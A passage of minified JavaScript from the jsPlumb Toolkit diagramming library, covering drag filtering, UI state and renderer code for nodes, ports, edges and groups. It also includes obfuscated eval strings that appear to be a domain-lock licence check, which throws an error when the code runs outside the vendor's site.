%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = (a.jsPlumb,
    a.jsPlumbToolkit);
    b.UI = b.UI || {};
    var c = b.UI;
    c.ActiveDragFilter = function(a, b, c) {
        var d = {};
        b.bind("connectionDrag", function(b) {
            function e(b, e) {
                f = c.beforeConnect(b, e),
                j = e.getFullId(),
                f === !1 && null == d[j] && (d[j] = a.setTargetEnabled(e, !1))
            }
            var f, g, h, i, j, k = b.source.jtk.port, l = k ? k.getNode() : b.source.jtk.node, m = c.getNodeCount();
            if (k)
                for (e(k, l),
                g = l.getPorts(),
                h = 0; h < g.length; h++)
                    e(k, g[h]);
            for (h = 0; h < m; h++) {
                var n = c.getNodeAt(h);
                for (e(k, n),
                g = n.getPorts(),
                i = 0; i < g.length; i++)
                    e(k, g[i])
            }
        }),
        b.bind("connectionDragStop", function() {
            function b(b) {
                d[b.getFullId()] === !0 && a.setTargetEnabled(b, !0)
            }
            for (var e = c.getNodeCount(), f = 0; f < e; f++) {
                var g = c.getNodeAt(f);
                b(g);
                for (var h = g.getPorts(), i = 0; i < h.length; i++)
                    b(h[i])
            }
            d = {}
        })
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbToolkit.Renderers
      , c = a.jsPlumbToolkit
      , d = a.jsPlumbToolkitUtil
      , e = a.jsPlumbUtil
      , f = a.jsPlumb
      , g = a.Rotors;
    c.UIState = function(a, b, c) {
        for (var d in b)
            if (b.hasOwnProperty(d)) {
                var e = "*" === d ? "e-state-" + a : "e-state-" + a + "-" + d
                  , f = "*" === d ? "c-state-" + a : "c-state-" + a + "-" + d;
                c.registerEndpointType(e, b[d]),
                c.registerConnectionType(f, b[d])
            }
        this.activate = function(d, e, f) {
            d.eachEdge(function(c, d) {
                var h = e.getRenderedConnection(d.getId())
                  , i = f.getEdgeType(d.data)
                  , j = i ? "c-state-" + a + "-" + i : null;
                j && h.addType(j, d.data),
                b["*"] && h.addType("c-state-" + a, d.data),
                g(d, h, d.source, 0, "addType", f),
                g(d, h, d.target, 1, "addType", f)
            }),
            d.eachNode(function(a, d) {
                var g = f.getNodeType(d.data)
                  , h = g ? b[g] : null
                  , i = e.getRenderedNode(d.id);
                h && h.cssClass && c.addClass(i, h.cssClass),
                b["*"] && c.addClass(i, b["*"].cssClass)
            })
        }
        ;
        var g = function(b, c, d, e, f, g) {
            var h = c.endpoints[e]
              , i = g.getPortType(d.data);
            h[f]("e-state-" + a + "-" + i),
            h[f]("e-state-" + a)
        };
        this.deactivate = function(d, e, f) {
            d.eachEdge(function(c, d) {
                var h = e.getRenderedConnection(d.getId())
                  , i = f.getEdgeType(d.data)
                  , j = i ? "c-state-" + a + "-" + i : null;
                j && h.removeType(j, d.data),
                b["*"] && h.removeType("c-state-" + a),
                g(d, h, d.source, 0, "removeType", f),
                g(d, h, d.target, 1, "removeType", f)
            }),
            d.eachNode(function(a, d) {
                var g = f.getNodeType(d.data)
                  , h = g ? b[g] : null
                  , i = e.getRenderedNode(d.id);
                h && h.cssClass && c.removeClass(i, h.cssClass),
                b["*"] && c.removeClass(i, b["*"].cssClass)
            })
        }
    }
    ;
    var h = b.atts = {
        NODE: "data-jtk-node-id",
        PORT: "data-jtk-port-id",
        GROUP: "data-jtk-group-id"
    }
      , i = b.els = {
        SOURCE: "JTK-SOURCE",
        PORT: "JTK-PORT",
        TARGET: "JTK-TARGET"
    }
      , j = c.Classes
      , k = c.Constants
      , l = c.Events;
    b.mouseEvents = ["click", "dblclick", "contextmenu", "mousedown", "mouseup", "mousemove", "mouseenter", "mouseleave", "mouseover"],
    b.createElement = function(a, b) {
        var c = {
            width: a.width,
            height: a.height,
            position: a.position || k.absolute
        }
          , d = {};
        a.display && (c.display = a.display),
        a.id && (d.id = a.id),
        a.top && (c.top = a.top + "px"),
        a.left && (c.left = a.left + "px"),
        a.right && (c.right = a.right + "px"),
        a.bottom && (c.bottom = a.bottom + "px");
        var e = f.createElement(a.type || k.div, c, a.clazz, d);
        return null != b && f.appendElement(e, b),
        e
    }
    ;
    var m = b.DOMElementAdapter = function(a) {
        var b = this.getJsPlumb()
          , c = b.getElement(a.container);
        this.getWidth = function() {
            return b.getSize(c)[0]
        }
        ,
        this.getHeight = function() {
            return b.getSize(c)[1]
        }
        ,
        this.append = function(a) {
            var d = b.getElement(a);
            b.appendElement(d, c)
        }
        ,
        this.remove = function(a) {
            var c = b.getElement(a);
            b.removeElement(c)
        }
        ,
        this.setAbsolutePosition = f.setAbsolutePosition,
        this.getOffset = function(a, c) {
            return b.getOffset(a, c)
        }
    }
      , n = b.AbstractRenderer = function(a) {
        function b(a) {
            Q = !0;
            try {
                a()
            } catch (a) {
                jsPlumbUtil.log("An error occurred while ignoring Toolkit events", a)
            } finally {
                Q = !1
            }
        }
        function m(a, b, c) {
            if (null == a.value("jtk-processed")) {
                a.setValue("jtk-processed", !0);
                var d = ya(a, b, c)
                  , e = J.addEndpoint(a.element, d);
                xa[b.id + "." + d.portId] = e;
                var f = a.port || b.addPort({
                    id: d.portId
                });
                e.graph = {
                    node: b,
                    port: f
                },
                t.onUpdate(a.element, function() {})
            }
        }
        function n(a, b, c) {
            if (null == a.value("jtk-processed")) {
                a.setValue("jtk-processed", !0);
                var d = ya(a, b, c);
                null != d.portId && (T[b.id + "." + d.portId] = a.element,
                a.element.jtk = a.element.jtk || {},
                a.element.jtk.port = v.addPort(b, {
                    id: d.portId,
                    type: d.portType || "default"
                }, !0));
                var e = a.value("filter");
                if (e) {
                    var g = a.value("filter-exclude")
                      , h = "true" === g;
                    d.filter = e,
                    d.filterExclude = h
                }
                "true" === a.value("is-source") && (d.isSource = !0),
                delete d.uniqueEndpoint,
                d.extract = {},
                a.findDataValues(d.extract);
                var i, j = a.element._katavorioDrop ? a.element._katavorioDrop.length : 0;
                J.makeSource(a.element, d);
                var k = a.element._katavorioDrop ? a.element._katavorioDrop.length : 0;
                k > j && (i = a.element._katavorioDrop[a.element._katavorioDrop.length - 1]),
                t.onUpdate(a.element, function(a, c) {
                    var d = f.getSelector(a, "jtk-source");
                    if (1 === d.length) {
                        var e = ya(d[0], b);
                        e.scope && (J.setSourceScope(a, e.scope, e.edgeType),
                        i && i.k.setDropScope(i, e.scope))
                    }
                })
            }
        }
        function o(a, b, c) {
            if (null == a.value("jtk-processed")) {
                a.setValue("jtk-processed", !0);
                var d = ya(a, b, c);
                null != d.portId && (T[b.id + "." + d.portId] = a.element,
                a.element.jtk = a.element.jtk || {},
                a.element.jtk.port = v.addPort(b, {
                    id: d.portId,
                    type: d.portType || "default"
                }, !0)),
                "true" === a.value("is-target") && (d.isTarget = !0),
                J.makeTarget(a.element, d);
                var e = a.element._katavorioDrop[a.element._katavorioDrop.length - 1];
                t.onUpdate(a.element, function(a, c) {
                    var d = f.getSelector(a, "jtk-target");
                    if (1 === d.length) {
                        var g = ya(d[0], b);
                        g.scope && (e.targetDef.def.scope = g.scope,
                        e.k.setDropScope(e, g.scope))
                    }
                })
            }
        }
        a = a || {};
        var p = function(a, b) {
            var c = f.createElement("div", {
                border: "1px solid #456",
                position: "absolute"
            }, j.NODE);
            return c.innerHTML = a.name || a.id,
            c
        }
          , q = '<div data-jtk-node-id="${id}" class="' + j.NODE + '"></div>'
          , r = {
            rotors: {
                render: function(a, b) {
                    return t.template(a, b).childNodes[0]
                }
            }
        }
          , s = "rotors"
          , t = g.newInstance({
            defaultTemplate: q,
            templateResolver: a.templateResolver,
            templates: a.templates
        })
          , u = this
          , v = a.toolkit
          , w = new c.Layouts.EmptyLayout(u)
          , x = f.getElement(a.container)
          , y = !(a.elementsDraggable === !1)
          , z = a.elementsDroppable === !0
          , A = !1
          , B = a.refreshAutomatically !== !1
          , C = a.templateRenderer ? e.isString(a.templateRenderer) ? r[a.templateRenderer] : {
            render: a.templateRenderer
        } : r[s]
          , D = a.enhancedView !== !1
          , E = a.assignPosse || function() {
            return null
        }
          , F = a.modelLeftAttribute || "left"
          , G = a.modelTopAttribute || "top"
          , H = a.storePositionsInModel !== !1
          , I = e.merge(a.jsPlumb || {})
          , J = a.jsPlumbInstance || f.getInstance(I, a.overrideFns)
          , K = J.getId(x);
        J.bind("beforeDrop", function(a) {
            var b = a.connection
              , c = b.endpoints[0].graph || b.source.jtk
              , d = b.endpoints[1].graph || b.target.jtk
              , e = c.port || c.node || c.group
              , f = d.port || d.node || d.group
              , g = a.connection.edge;
            return null == g ? v.beforeConnect(e, f, a.connection.getData()) : v.beforeMoveConnection(e, f, g)
        }),
        J.bind("beforeDrag", function(a) {
            var b = a.endpoint.graph || a.source.jtk
              , c = b.port || b.node
              , d = a.endpoint.connectionType
              , e = v.beforeStartConnect(c, d);
            return e === !1 && a.endpoint.isTemporarySource && a.endpoint._deleteOnDetach && J.deleteEndpoint(a.endpoint),
            e
        }),
        J.bind("beforeDetach", function(a, b) {
            var c = a.endpoints[0].graph || a.source.jtk
              , d = a.endpoints[1].graph || a.target.jtk
              , e = c.port || c.node
              , f = d.port || d.node
              , g = a.edge;
            return v.beforeDetach(e, f, g, b)
        }),
        J.bind("beforeStartDetach", function(a) {
            var b = a.endpoint.graph || a.source.jtk
              , c = b.port || b.node
              , d = a.connection.edge;
            return v.beforeStartDetach(c, d)
        }),
        J.bind("connectionEdit", function(a) {
            a.edge && (a.edge.geometry = a.getConnector().getGeometry())
        }),
        e.EventGenerator.apply(this, arguments),
        a.activeFiltering && new c.UI.ActiveDragFilter(u,J,v),
        this.getJsPlumb = function() {
            return J
        }
        ,
        this.getToolkit = function() {
            return v
        }
        ;
        var L = [l.canvasClick, l.canvasDblClick, l.nodeAdded, l.nodeDropped, l.nodeRemoved, l.nodeRendered, l.groupAdded, l.groupRemoved, l.groupMoveEnd, l.groupMemberAdded, l.groupMemberRemoved, l.groupCollapse, l.groupExpand, l.nodeMoveStart, l.nodeMoveEnd, l.portAdded, l.portRemoved, l.edgeAdded, l.edgeRemoved, l.edgeTypeChanged, l.nodeTypeChanged, l.portTypeChanged, l.dataLoadEnd, l.anchorChanged, l.objectRepainted, l.modeChanged, l.lassoEnd, l.pan, l.zoom, l.relayout, l.click, l.tap, l.stateRestored, l.startOverlayAnimation, l.endOverlayAnimation]
          , M = u.bind
          , N = J.bind;
        if (this.setHoverSuspended = J.setHoverSuspended,
        this.isHoverSuspended = J.isHoverSuspended,
        this.setJsPlumbDefaults = function(a) {
            delete a.Container,
            J.restoreDefaults(),
            J.importDefaults(a)
        }
        ,
        this.bind = function(a, b) {
            L.indexOf(a) == -1 ? N(a, b) : M(a, b)
        }
        ,
        a.events)
            for (var O in a.events)
                this.bind(O, a.events[O]);
        if (a.interceptors)
            for (var P in a.interceptors)
                this.bind(P, a.interceptors[P]);
        var Q = !1;
        N(l.connection, function(a) {
            if (null == a.connection.edge) {
                Q = !0,
                a.sourceEndpoint.getParameter("nodeId") || a.sourceEndpoint.setParameter("nodeId", S[a.sourceEndpoint.elementId].id),
                a.targetEndpoint.getParameter("nodeId") || a.targetEndpoint.setParameter("nodeId", S[a.targetEndpoint.elementId].id);
                var b = a.sourceEndpoint.getParameter("portType")
                  , c = oa.getPortDefinition(b)
                  , d = null != c && c.edgeType ? c.edgeType : a.sourceEndpoint.getParameter("edgeType") || "default"
                  , e = a.sourceEndpoint.getParameter("nodeId")
                  , f = a.sourceEndpoint.getParameter("portId")
                  , g = a.targetEndpoint.getParameter("nodeId")
                  , h = a.targetEndpoint.getParameter("portId")
                  , i = e + (f ? "." + f : "")
                  , j = g + (h ? "." + h : "")
                  , k = {
                    sourceNodeId: e,
                    sourcePortId: f,
                    targetNodeId: g,
                    targetPortId: h,
                    type: d,
                    source: v.getNode(i),
                    target: v.getNode(j),
                    sourceId: i,
                    targetId: j
                }
                  , m = v.getEdgeFactory()(d, a.connection.getData() || {}, function(b) {
                    k.edge = v.addEdge({
                        source: i,
                        target: j,
                        cost: a.connection.getCost(),
                        directed: a.connection.isDirected(),
                        data: b,
                        addedByMouse: !0
                    }, u),
                    Z[k.edge.getId()] = a.connection,
                    a.connection.edge = k.edge,
                    ba(d, k.edge, a.connection),
                    k.addedByMouse = !0,
                    u.fire(l.edgeAdded, k)
                });
                m === !1 && J.detach(a.connection),
                Q = !1
            }
        }),
        N(l.connectionMoved, function(a) {
            var c = 0 === a.index ? a.newSourceEndpoint : a.newTargetEndpoint
              , d = c.graph || c.element.jtk;
            b(function() {
                v.edgeMoved(a.connection.edge, d.port || d.node || d.group, a.index)
            })
        }),
        N(l.connectionDetached, function(a) {
            b(function() {
                v.removeEdge(a.connection.edge)
            });
            var c = a.sourceEndpoint.getParameters()
              , d = a.targetEndpoint.getParameters()
              , e = c.nodeId + (c.portId ? "." + c.portId : "")
              , f = d.nodeId + (d.portId ? "." + d.portId : "");
            u.fire(l.edgeRemoved, {
                sourceNodeId: c.nodeId,
                targetNodeId: d.nodeId,
                sourcePortId: c.portId,
                targetPortId: d.portId,
                sourceId: e,
                targetId: f,
                source: v.getNode(e),
                target: v.getNode(f),
                edge: a.connection.edge
            })
        }),
        N(l.groupDragStop, function(a) {
            u.getLayout().setPosition(a.group.id, a.pos[0], a.pos[1], !0),
            a.uigroup = a.group,
            u.fire(l.groupMoveEnd, f.extend(a, {
                group: v.getGroup(a.uigroup.id)
            }))
        }),
        N(l.groupMemberAdded, function(a) {
            if (!A && a.el.jtk.node) {
                var b = v.addToGroup(a.el.jtk.node, a.group.id);
                b && u.fire(l.groupMemberAdded, {
                    node: a.el.jtk.node,
                    group: b,
                    uigroup: a.group
                }),
                ja()
            }
        }),
        N(l.groupMemberRemoved, function(a) {
            if (!A && a.el.jtk.node) {
                var b = v.removeFromGroup(a.el.jtk.node);
                b && (u.nodeRemovedFromGroup(a.el),
                u.fire(l.groupMemberRemoved, {
                    node: a.el.jtk.node,
                    ugroup: b,
                    igroup: a.group
                })),
                ja()
            }
        }),
        N(l.groupCollapse, function(a) {
            var b = v.getGroup(a.group.id);
            b && u.fire(l.groupCollapse, {
                group: b,
                uigroup: a.group
            })
        }),
        N(l.groupExpand, function(a) {
            var b = v.getGroup(a.group.id);
            b && u.fire(l.groupExpand, {
                group: b,
                uigroup: a.group
            })
        });
        var R = {}
          , S = {}
          , T = {}
          , U = {}
          , V = []
          , W = {}
          , X = []
          , Y = function(a) {
            var b = X.indexOf(a);
            b !== -1 && X.splice(b, 1)
        };
        this.getNodeCount = function() {
            return X.length
        }
        ,
        this.getNodeAt = function(a) {
            return X[a]
        }
        ,
        this.getNodes = function() {
            return X
        }
        ,
        this.getNode = function(a) {
            return R[a]
        }
        ,
        this.getGroupCount = function() {
            return V.length
        }
        ,
        this.getGroupAt = function(a) {
            return V[a]
        }
        ,
        this.getGroups = function() {
            return V
        }
        ;
        var Z = {}
          , $ = function(a) {
            return Z[a.getId()]
        }
          , _ = function(a) {
            for (var b = [], c = 0; c < a.length; c++)
                b.push(Z[a[c].getId()]);
            return b
        }
          , aa = function(a, b, c, d) {
            d.bind(a, function(a, e) {
                b.apply(b, [{
                    edge: c,
                    e: e,
                    connection: d,
                    toolkit: v,
                    renderer: u
                }])
            })
        }
          , ba = function(a, b, c) {
            if (!c.getParameter("edge")) {
                var d = oa.getEdgeDefinition(a);
                if (d && d.events)
                    for (var e in d.events)
                        aa(e, d.events[e], b, c)
            }
        }
          , ca = function(a, b) {
            var c = a.endpoints[0].getParameters()
              , d = a.endpoints[1].getParameters()
              , e = c.nodeId + (c.portId ? "." + c.portId : "")
              , f = d.nodeId + (d.portId ? "." + d.portId : "");
            u.fire(l.edgeRemoved, {
                sourceNodeId: c.nodeId,
                targetNodeId: d.nodeId,
                sourcePortId: c.portId,
                targetPortId: d.portId,
                sourceId: e,
                targetId: f,
                source: v.getNode(e),
                target: v.getNode(f),
                edge: b
            })
        };
        this.setSuspendRendering = function(a, b) {
            A = a,
            J.setSuspendDrawing(a),
            b && this.refresh()
        }
        ,
        this.batch = function(a) {
            this.setSuspendEvents(!0),
            v.batch(a),
            this.setSuspendEvents(!1)
        }
        ;
        var da = function(a, b) {
            if (A)
                fa.push([a, b]);
            else {
                var c = E(b);
                if (null != c) {
                    var d = e.isArray(c) ? c : [c];
                    d.unshift(a),
                    J.addToPosse.apply(J, d)
                }
            }
        }
          , ea = function() {
            for (var a = 0; a < fa.length; a++)
                da.apply(this, fa[a])
        }
          , fa = [];
        if (this.bindToolkitEvents !== !1) {
            var ga = function() {
                fa.length = 0,
                J.setSuspendDrawing(!0),
                this.setSuspendRendering(!0)
            }
            .bind(this);
            v.bind(l.dataLoadStart, ga),
            v.bind(l.dataAppendStart, ga),
            v.bind(l.dataLoadEnd, function() {
                this.setSuspendRendering(!1),
                ea(),
                J.getGroupManager().refreshAllGroups(),
                ma(),
                u.relayout(),
                J.setSuspendDrawing(!1, !0),
                w && u.fire(l.dataLoadEnd)
            }
            .bind(this)),
            v.bind(l.dataAppendEnd, function() {
                this.setSuspendRendering(!1),
                ea(),
                u.refresh(),
                J.setSuspendDrawing(!1, !0),
                w && u.fire(l.dataAppendEnd)
            }
            .bind(this));
            var ha = function(a, b, c) {
                var d = U[c.id];
                if (d) {
                    var e = d.querySelector("[jtk-group-content]") || d;
                    e.appendChild(a),
                    J.addToGroup(c.id, a, !0),
                    u.nodeAppendedToGroup(a, d, c)
                }
            }
              , ia = function(a, b) {
                var c = R[a.id];
                if (null == c) {
                    var d = oa.getNodeDefinition(v.getNodeType(a.data));
                    if (d.ignore === !0)
                        return !1;
                    if (c = ta(a, a.data, a),
                    !c)
                        throw new Error("Cannot render node");
                    var e = J.getId(c);
                    R[a.id] = c,
                    S[e] = a,
                    X.push(a),
                    c.jtk = {
                        node: a
                    },
                    null == a.group ? u.append(c, e, b ? b.position : null) : ha(c, a, a.group),
                    da(c, a),
                    Ba(c, a);
                    var f = {
                        node: a,
                        el: c,
                        id: a.id
                    };
                    u.getLayout().nodeAdded(f, b),
                    u.fire(l.nodeAdded, f)
                }
                return c
            };
            v.bind(l.nodeAdded, function(a) {
                var b, c = a.node, d = ia(c, a.eventInfo);
                if (null != d) {
                    var e = J.getSelector(d, "[data-port-id]");
                    for (b = 0; b < e.length; b++) {
                        var f = e[b].getAttribute("data-port-id");
                        T[c.id + "." + f] = e[b],
                        e[b].jtk = e[b].jtk || {
                            node: c,
                            port: c.getPort(f)
                        }
                    }
                    u.refresh(!0)
                }
            }),
            v.bind(l.nodeRemoved, function(a) {
                u.getLayout().nodeRemoved(a.nodeId);
                var b = R[a.nodeId];
                u.fire(l.nodeRemoved, {
                    node: a.nodeId,
                    el: b
                });
                var c = J.getId(b);
                t.remove(b),
                J.remove(b),
                delete R[a.nodeId],
                delete S[c],
                Y(a.node),
                delete b.jtk,
                u.refresh(!0)
            });
            var ja = function() {
                a.relayoutOnGroupUpdate && u.relayout()
            };
            v.bind("group:addMember", ja),
            v.bind("group:removeMember", ja);
            var ka = function(b, c) {
                var d = U[b.id];
                if (null == d) {
                    var g = oa.getGroupDefinition(v.getNodeType(b.data));
                    if (g.ignore === !0)
                        return !1;
                    if (d = va(b, b.data, b),
                    !d)
                        throw new Error("Cannot render Group");
                    var h = J.getId(d);
                    U[b.id] = d,
                    V.push(b),
                    W[h] = b,
                    d.jtk = {
                        group: b
                    },
                    u.append(d, h, c ? c.position : null),
                    da(d, b),
                    Ba(d, b);
                    var i = {
                        node: b,
                        el: d
                    }
                      , j = {
                        el: d,
                        id: b.id
                    };
                    f.extend(j, {
                        dragOptions: a.dragOptions || {}
                    }),
                    j.dragOptions[f.dragEvents[k.stop]] = e.wrap(j.dragOptions[f.dragEvents[k.stop]], function(a) {
                        a.el.jtk && a.el.jtk.group && (j.dragOptions.magnetize ? a.pos = u.getLayout().setMagnetizedPosition(a.el.jtk.group.id, a.pos[0], a.pos[1], !0) : u.getLayout().setPosition(a.el.jtk.group.id, a.pos[0], a.pos[1], !0),
                        H !== !1 && (u.storePositionInModel({
                            id: a.el.jtk.group.id,
                            group: !0,
                            leftAttribute: F,
                            topAttribute: G
                        }),
                        v.fire(l.groupUpdated, {
                            group: a.el.jtk.group
                        }, null)),
                        u.fire(l.groupMoveEnd, {
                            el: a.el,
                            group: a.el.jtk.group,
                            pos: a.pos,
                            e: a.e,
                            eventPosition: a.pos
                        }))
                    }),
                    J.addGroup(f.extend(j, g)),
                    u.getLayout().groupAdded({
                        group: b,
                        el: d,
